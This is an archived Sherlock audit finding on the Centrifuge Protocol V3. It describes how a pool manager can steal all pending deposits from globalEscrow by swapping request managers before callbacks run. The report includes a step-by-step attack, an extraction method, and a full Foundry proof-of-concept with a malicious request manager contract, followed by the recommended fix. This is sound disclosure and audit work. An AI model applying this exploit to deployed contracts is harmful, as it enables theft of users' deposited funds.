---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/dex
  - sector/governance
  - sector/token
protocol: "[[Centrifuge]]"
auditors:
  - "[[0x52]]"
  - "[[0xRstStn]]"
  - "[[6PottedL]]"
  - "[[Audittens]]"
  - "[[LeFy]]"
  - "[[NovaTheMachine]]"
  - "[[PowPowPow]]"
  - "[[Waydou]]"
  - "[[anonymousjoe]]"
  - "[[asui]]"
  - "[[gh0xt]]"
  - "[[skybluescar]]"
report: "https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit-judging"
genome:
  - "[[centralization]]"
  - "[[direct-drain]]"
  - "[[bridge-sender-auth]]"
  - "[[timestamp-dependence]]"
---
# H-1: Pool managers can steal all other pools' pending deposits from `globalEscrow` via malicious `requestManager` swapping

- id: 64195
- impact: HIGH
- protocol: [[Centrifuge]] Protocol V3 Audit
- reporter: 0x52 (Sherlock)
- source: N/A

## Summary


This bug report discusses a vulnerability found in the request manager system of the Centrifuge Protocol. The vulnerability allows attackers to steal all pending user deposits from the globalEscrow. This can be done by creating fraudulent deposit requests with a malicious request manager and then swapping to the AsyncRequestManager before triggering approvedDeposits callbacks. This enables the attacker to transfer legitimate user funds from the globalEscrow to their own pool escrow, resulting in the theft of all pending deposit funds across all vaults and pools.

The root cause of this vulnerability is a flaw in the Spoke.sol contract, specifically in the requestCallback() function. This function uses the current request manager without verifying that it is the same manager that created the request. This allows attackers to exploit the system by creating requests with one manager and then swapping to a different manager before callbacks execute.

The protocol team has addressed this issue by fixing the code in the Spoke.sol contract and implementing additional security measures in the form of PRs/commits. They have also provided a proof of concept for this vulnerability and discussed alternative attack vectors and how an attacker can extract stolen funds.

Overall, this bug report serves as a warning to users of the Centrifuge Protocol to be cautious and vigilant in their use of the platform. It also highlights the importance of thorough code reviews and security audits to identify and fix vulnerabilities in a timely manner. 

## Details


Source: https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit-judging/issues/641 

## Found by 
0x52, 0xRstStn, 6PottedL, Audittens, LeFy, NovaTheMachine, PowPowPow, Waydou, anonymousjoe, asui, gh0xt, skybluescar

## Summary

The request manager system allows attackers to steal all pending user deposits from `globalEscrow`. An attacker can create fraudulent deposit requests with a malicious request manager, then swap to `AsyncRequestManager` before triggering `approvedDeposits` callbacks. This causes `AsyncRequestManager.approvedDeposits()` to transfer legitimate user funds from `globalEscrow` to the attacker's pool escrow, enabling theft of all pending deposit funds across all vaults and pools.

## Root Cause

**[Spoke.sol#L340-L345](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/spoke/Spoke.sol#L340-L345)** - `Spoke.requestCallback()` uses the current `requestManager[poolId]` allowing attackers to create fraudulent requests with a malicious manager then swap to `AsyncRequestManager` to receive `approvedDeposits` callbacks that transfer funds from `globalEscrow`.

## Vulnerability Detail

The protocol uses a request manager pattern where each pool can set a pluggable request manager to handle deposit and redeem requests. The `Spoke.request()` function validates that the caller is the current request manager:

[Spoke.sol#L322-L337](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/spoke/Spoke.sol#L322-L337)
```solidity
function request(
    PoolId poolId,
    ShareClassId scId,
    AssetId assetId,
    bytes memory payload,
    address refund,
    bool unpaid
) external payable {
    IRequestManager manager = requestManager[poolId];
    require(address(manager) != address(0), InvalidRequestManager());
    require(msg.sender == address(manager), NotAuthorized());

    gateway.setUnpaidMode(unpaid);
    sender.sendRequest{value: msg.value}(poolId, scId, assetId, payload, refund);
    gateway.setUnpaidMode(false);
}
```

However, when the callback returns from the hub, `Spoke.requestCallback()` uses the current `requestManager[poolId]` without validating it's the same manager that created the request:

[Spoke.sol#L340-L345](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/spoke/Spoke.sol#L340-L345)
```solidity
function requestCallback(PoolId poolId, ShareClassId scId, AssetId assetId, bytes memory payload) external auth {
    IRequestManager manager = requestManager[poolId];
    require(address(manager) != address(0), InvalidRequestManager());

    manager.callback(poolId, scId, assetId, payload);
}
```

Pool managers can swap request managers at any time via `hub.setRequestManager()`:

[Hub.sol#L222-L235](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/hub/Hub.sol#L222-L235)
```solidity
function setRequestManager(
    PoolId poolId,
    uint16 centrifugeId,
    IHubRequestManager hubManager,
    bytes32 spokeManager,
    address refund
) external payable {
    _isManager(poolId);

    hubRegistry.setHubRequestManager(poolId, centrifugeId, hubManager);

    emit SetSpokeRequestManager(centrifugeId, poolId, spokeManager);
    sender.sendSetRequestManager{value: msgValue()}(centrifugeId, poolId, spokeManager, refund);
}
```

All user deposits go to `globalEscrow` regardless of whether the pool is local or remote. When users call `AsyncVault.requestDeposit()`, assets are transferred directly to `globalEscrow`:

[AsyncVault.sol#L44-53](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/vaults/AsyncVault.sol#L44-53)
```solidity
function requestDeposit(uint256 assets, address controller, address owner) public returns (uint256) {
    require(owner == msg.sender || isOperator[owner][msg.sender], InvalidOwner());
    require(IERC20(asset).balanceOf(owner) >= assets, InsufficientBalance());

    require(asyncManager().requestDeposit(this, assets, controller, owner, msg.sender), RequestDepositFailed());
    SafeTransferLib.safeTransferFrom(asset, owner, address(baseManager.globalEscrow()), assets);
    // ...
}
```

When deposits are approved, `AsyncRequestManager.approvedDeposits()` transfers these assets from `globalEscrow` to the pool's escrow:

[AsyncRequestManager.sol#L254-270](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/vaults/AsyncRequestManager.sol#L254-270)
```solidity
function approvedDeposits(
    PoolId poolId,
    ShareClassId scId,
    AssetId assetId,
    uint128 assetAmount,
    D18 pricePoolPerAsset
) public auth {
    (address asset, uint256 tokenId) = spoke.idToAsset(assetId);

    // Note deposit and transfer from global escrow into the pool escrow
    balanceSheet.overridePricePoolPerAsset(poolId, scId, assetId, pricePoolPerAsset);
    balanceSheet.noteDeposit(poolId, scId, asset, tokenId, assetAmount);
    balanceSheet.resetPricePoolPerAsset(poolId, scId, assetId);

    globalEscrow.authTransferTo(asset, tokenId, address(poolEscrow(poolId)), assetAmount);
}
```

An attacker can exploit this by:

1. Creating their own pool and setting a malicious request manager
2. The malicious manager creates fraudulent deposit requests via `spoke.request()` - this passes validation because `msg.sender` is the current manager
3. The attacker swaps to `AsyncRequestManager` via `hub.setRequestManager()`
4. As the pool manager, the attacker calls `batchRequestManager.approveDeposits()` which triggers callbacks
5. The callback executes via `spoke.requestCallback()` which calls the current manager (`AsyncRequestManager`)
6. `AsyncRequestManager.approvedDeposits()` transfers funds from `globalEscrow` to the attacker's pool escrow

The key issue is that `spoke.requestCallback()` trusts the current `requestManager[poolId]` to be the same manager that created the request, but this is not enforced. The attacker exploits this by creating requests with one manager, then swapping to a different manager before callbacks execute.

**Alternative attack vector:** Instead of using `batchRequestManager.approveDeposits()`, the attacker can swap the hub request manager to a malicious implementation and send `approvedDeposits` callbacks directly from the malicious hub manager. This bypasses the need to call `batchRequestManager.approveDeposits()` entirely.

**Extracting stolen funds:** Once funds are transferred to the attacker's pool escrow, extracting them is trivial. The attacker can set themselves as a manager of their pool on the `balanceSheet` via `hub.updateBalanceSheetManager()`, then call `balanceSheet.withdraw()` to transfer all stolen funds to their own address.

## Proof of Concept

Add the following file to `protocol/test`:

```solidity
pragma solidity 0.8.28;

import "./core/spoke/integration/BaseTest.sol";
import {IRequestManager} from "../src/core/interfaces/IRequestManager.sol";
import {ISpoke} from "../src/core/spoke/interfaces/ISpoke.sol";
import {IHubRequestManager} from "../src/core/hub/interfaces/IHubRequestManager.sol";
import {PoolId, newPoolId} from "../src/core/types/PoolId.sol";
import {ShareClassId} from "../src/core/types/ShareClassId.sol";
import {AssetId, newAssetId} from "../src/core/types/AssetId.sol";
import {VaultKind} from "../src/core/spoke/interfaces/IVault.sol";
import {RequestMessageLib} from "../src/vaults/libraries/RequestMessageLib.sol";
import {RequestCallbackMessageLib} from "../src/vaults/libraries/RequestCallbackMessageLib.sol";
import {IBatchRequestManager} from "../src/vaults/interfaces/IBatchRequestManager.sol";
import {D18, d18} from "../src/misc/types/D18.sol";
import {AsyncVault} from "../src/vaults/AsyncVault.sol";
import {CastLib} from "../src/misc/libraries/CastLib.sol";
import "forge-std/console.sol";

/**
 * @notice Malicious request manager for manager swap attack
 */
contract MaliciousRequestManager is IRequestManager {
    using RequestMessageLib for *;
    ISpoke public spoke;
    PoolId public poolId;
    ShareClassId public scId;
    AssetId public assetId;
    address public attacker;
    uint128 public stolenAmount;

    constructor(address _spoke, PoolId _poolId, ShareClassId _scId, AssetId _assetId, address _attacker) {
        spoke = ISpoke(_spoke);
        poolId = _poolId;
        scId = _scId;
        assetId = _assetId;
        attacker = _attacker;
    }

    function createFraudulentDeposit(uint128 amount, bytes32 investor) external {
        stolenAmount = amount;

        bytes memory payload = RequestMessageLib.DepositRequest(investor, amount).serialize();

        // This call passes because msg.sender == this (the request manager)
        spoke.request(poolId, scId, assetId, payload, address(this), true);
    }

    function callback(PoolId, ShareClassId, AssetId, bytes calldata) external pure {
        revert("Should not be called");
    }
}

contract RequestManagerSwapTest is BaseTest {
    using RequestMessageLib for *;
    using RequestCallbackMessageLib for *;
    using CastLib for *;

    MaliciousRequestManager public maliciousManager;
    PoolId public attackerPool;
    ShareClassId public attackerScId;
    AssetId public testAssetId;
    address public legitimateInvestor = makeAddr("legitimateInvestor");
    address public attackerAddress = makeAddr("attacker");

    function setUp() public override {
        super.setUp();

        attackerScId = ShareClassId.wrap(defaultShareClassId);

        // Create attacker's pool on THIS_CHAIN_ID
        attackerPool = newPoolId(THIS_CHAIN_ID, 999);

        // Set up adapters for THIS_CHAIN_ID so messages can reach the spoke
        multiAdapter.setAdapters(
            THIS_CHAIN_ID, attackerPool, testAdapters, uint8(testAdapters.length), uint8(testAdapters.length)
        );

        // Register attacker pool on hub with attacker as manager (use non-zero AssetId for currency)
        hubRegistry.registerPool(attackerPool, attackerAddress, AssetId.wrap(840));

        // Add pool and share class to spoke (similar to deployVault helper)
        spoke.addPool(attackerPool);
        centrifugeChain.addShareClass(
            attackerPool.raw(),
            defaultShareClassId,
            "AttackerToken",
            "ATK",
            6,
            address(0)
        );
        centrifugeChain.updatePricePoolPerShare(attackerPool.raw(), defaultShareClassId, uint128(10 ** 18), uint64(block.timestamp));

        // Get or register the asset
        try spoke.assetToId(address(erc20), erc20TokenId) returns (AssetId existingAssetId) {
            testAssetId = existingAssetId;
        } catch {
            testAssetId = spoke.registerAsset{value: DEFAULT_GAS}(OTHER_CHAIN_ID, address(erc20), erc20TokenId, address(this));
        }

        // Update price for the asset
        centrifugeChain.updatePricePoolPerAsset(
            attackerPool.raw(), defaultShareClassId, testAssetId.raw(), uint128(10 ** 18), uint64(block.timestamp)
        );

        // Register the asset on the hub
        try hubRegistry.decimals(testAssetId) {} catch {
            hubRegistry.registerAsset(testAssetId, 6);
        }

        // Set asyncRequestManager as manager on balanceSheet for the attacker pool
        balanceSheet.updateManager(attackerPool, address(asyncRequestManager), true);

        // Fund attacker with ETH for gas
        vm.deal(attackerAddress, 10 ether);
    }

    /**
     * Attack flow:
     * 1. Legitimate investor deposits into POOL_A (on OTHER_CHAIN_ID), funds go to globalEscrow
     * 2. Attacker sets malicious request manager on their pool via hub.setRequestManager()
     * 3. Malicious manager creates fraudulent deposit request
     * 4. Attacker swaps back to AsyncRequestManager via hub.setRequestManager()
     * 5. Attacker calls batchRequestManager.approveDeposits() as pool manager
     * 6. This triggers AsyncRequestManager callback, transferring funds from globalEscrow to attacker pool
     */
    /// forge-config: default.isolate = true
    function testRequestManagerSwapStealsGlobalEscrow() public {
        console.log("\n=== REQUEST MANAGER SWAP ATTACK ===\n");

        // Step 1: Create legitimate deposits in globalEscrow by depositing to remote POOL_A
        console.log("Step 1: Legitimate investor deposits to POOL_A (remote), funds stay in globalEscrow");

        // Deploy vault for POOL_A on local spoke (POOL_A is on OTHER_CHAIN_ID)
        (, address poolAVault,) = deployVault(
            VaultKind.Async,
            6,
            address(fullRestrictionsHook),
            defaultShareClassId,
            address(erc20),
            erc20TokenId,
            OTHER_CHAIN_ID  // POOL_A is remote
        );

        // Deposit to POOL_A - funds will stay in globalEscrow because pool is remote
        uint128 legitimateDepositAmount = 1000e6;
        erc20.mint(legitimateInvestor, legitimateDepositAmount);
        centrifugeChain.updateMember(POOL_A.raw(), defaultShareClassId, legitimateInvestor, type(uint64).max);

        vm.startPrank(legitimateInvestor);
        erc20.approve(poolAVault, legitimateDepositAmount);
        AsyncVault(poolAVault).requestDeposit(legitimateDepositAmount, legitimateInvestor, legitimateInvestor);
        vm.stopPrank();

        uint256 globalEscrowBalanceBefore = erc20.balanceOf(address(asyncRequestManager.globalEscrow()));
        console.log("  GlobalEscrow balance:", globalEscrowBalanceBefore);
        assertEq(globalEscrowBalanceBefore, legitimateDepositAmount, "GlobalEscrow should have legitimate deposits");

        // Step 2: Set malicious request manager via hub.setRequestManager()
        console.log("\nStep 2: Attacker sets malicious request manager via hub.setRequestManager()");

        maliciousManager = new MaliciousRequestManager(
            address(spoke),
            attackerPool,
            attackerScId,
            testAssetId,
            attackerAddress
        );

        vm.prank(attackerAddress);
        hub.setRequestManager{value: DEFAULT_GAS}(
            attackerPool,
            THIS_CHAIN_ID,  // Set on local spoke
            IHubRequestManager(address(batchRequestManager)),  // Use batchRequestManager as hub manager
            address(maliciousManager).toBytes32(),
            attackerAddress
        );

        // Step 3: Create fraudulent deposit request
        console.log("\nStep 3: Malicious manager creates fraudulent deposit request");
        uint128 stolenAmount = 1000e6;

        maliciousManager.createFraudulentDeposit(
            stolenAmount,
            bytes32(bytes20(attackerAddress))
        );
        console.log("  Fraudulent deposit request created for:", stolenAmount);

        // Execute the fraudulent request message on the hub to increment pendingDeposit
        bytes memory fraudulentRequestMessage = adapter1.values_bytes("send");
        adapter1.execute(fraudulentRequestMessage);

        // Step 4: Swap back to AsyncRequestManager via hub.setRequestManager()
        console.log("\nStep 4: Attacker swaps back to AsyncRequestManager via hub");
        vm.prank(attackerAddress);
        hub.setRequestManager{value: DEFAULT_GAS}(
            attackerPool,
            THIS_CHAIN_ID,
            IHubRequestManager(address(batchRequestManager)),  // Keep batchRequestManager as hub manager
            address(asyncRequestManager).toBytes32(),
            attackerAddress
        );

        // Step 5: Attacker directly calls batchRequestManager.approveDeposits() as pool manager
        console.log("\nStep 5: Attacker calls batchRequestManager.approveDeposits() as pool manager");

        vm.prank(attackerAddress);
        batchRequestManager.approveDeposits{value: DEFAULT_GAS}(
            attackerPool,
            attackerScId,
            testAssetId,
            1,  // nowDepositEpochId (fraudulent request created epoch 0, now at epoch 1)
            stolenAmount,
            d18(1e18),  // 1:1 price
            attackerAddress
        );

        console.log("\n=== ATTACK RESULTS ===");

        uint256 globalEscrowBalanceAfter = erc20.balanceOf(address(asyncRequestManager.globalEscrow()));
        console.log("GlobalEscrow balance before attack:", globalEscrowBalanceBefore);
        console.log("GlobalEscrow balance after attack: ", globalEscrowBalanceAfter);
        console.log("Funds stolen from GlobalEscrow:    ", globalEscrowBalanceBefore - globalEscrowBalanceAfter);

        address attackerPoolEscrow = address(asyncRequestManager.poolEscrow(attackerPool));
        uint256 attackerPoolBalance = erc20.balanceOf(attackerPoolEscrow);
        console.log("Attacker pool escrow balance:     ", attackerPoolBalance);

        console.log("\n=== ATTACK SUCCESSFUL ===");
        console.log("Attacker stole", stolenAmount, "from legitimate deposits in globalEscrow\n");

        // Verify the theft
        assertEq(
            globalEscrowBalanceBefore - globalEscrowBalanceAfter,
            stolenAmount,
            "Funds should be stolen from globalEscrow"
        );
        assertEq(
            attackerPoolBalance,
            stolenAmount,
            "Stolen funds should be in attacker pool escrow"
        );
    }
}
```

## Impact

An attacker can steal funds from `globalEscrow` by creating fraudulent deposit requests with a malicious request manager, then swapping to `AsyncRequestManager` before callbacks execute. The `globalEscrow` holds all pending deposit funds from legitimate users across all vaults and pools. When the attacker's fraudulent requests are processed, `AsyncRequestManager.approvedDeposits()` transfers these legitimate user funds from `globalEscrow` to the attacker's pool escrow.

Extracting the stolen funds is trivial - the attacker simply sets themselves as a manager on `balanceSheet` via `hub.updateBalanceSheetManager()`, then calls `balanceSheet.withdraw()` to transfer all funds to their address.

The vulnerability allows theft of any amount up to the `globalEscrow` balance. Since `globalEscrow` aggregates all pending deposits across all vaults and pools on the spoke, a single attacker can steal pending funds from all legitimate pools in a single attack.

## Code Snippet

[Spoke.sol#L322-L337](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/spoke/Spoke.sol#L322-L337)

[Spoke.sol#L340-L345](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/spoke/Spoke.sol#L340-L345)

[Hub.sol#L222-L235](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/core/hub/Hub.sol#L222-L235)

[AsyncVault.sol#L44-L53](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/vaults/AsyncVault.sol#L44-L53)

[AsyncRequestManager.sol#L254-L270](https://github.com/sherlock-audit/2025-10-centrifuge-protocol-v3-1-audit/blob/main/protocol/src/vaults/AsyncRequestManager.sol#L254-L270)

## Tool Used

Manual Review

## Recommendation

Implement whitelists of authorized request managers on both the spoke and hub to prevent malicious managers from creating fraudulent requests and callbacks. The protocol should maintain governance-controlled whitelists and validate that request managers are on these lists before accepting requests or triggering callbacks.

```diff
contract Spoke {
+   // Whitelist of authorized request managers
+   mapping(address => bool) public authorizedRequestManagers;
+

    function request(
        PoolId poolId,
        ShareClassId scId,
        AssetId assetId,
        bytes memory payload,
        address refund,
        bool unpaid
    ) external payable {
        IRequestManager manager = requestManager[poolId];
        require(address(manager) != address(0), InvalidRequestManager());
        require(msg.sender == address(manager), NotAuthorized());
+       require(authorizedRequestManagers[address(manager)], UnauthorizedRequestManager());

        gateway.setUnpaidMode(unpaid);
        sender.sendRequest{value: msg.value}(poolId, scId, assetId, payload, refund);
        gateway.setUnpaidMode(false);
    }
}
```

```diff
contract Hub {
+   // Whitelist of authorized hub request managers
+   mapping(address => bool) public authorizedHubRequestManagers;
+

    function setRequestManager(
        PoolId poolId,
        uint16 centrifugeId,
        IHubRequestManager hubManager,
        bytes32 spokeManager,
        address refund
    ) external payable {
        _isManager(poolId);
+       require(authorizedHubRequestManagers[address(hubManager)], UnauthorizedHubRequestManager());

        hubRegistry.setHubRequestManager(poolId, centrifugeId, hubManager);

        emit SetSpokeRequestManager(centrifugeId, poolId, spokeManager);
        sender.sendSetRequestManager{value: msgValue()}(centrifugeId, poolId, spokeManager, refund);
    }
}
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/centrifuge/protocol-internal/pull/36






## Artifacts

- Raw capture: /Users/user/Desktop/crawlee-run/pages_capture.har
- Pages snapshot: /Users/user/Desktop/crawlee-run/all_findings_full.json
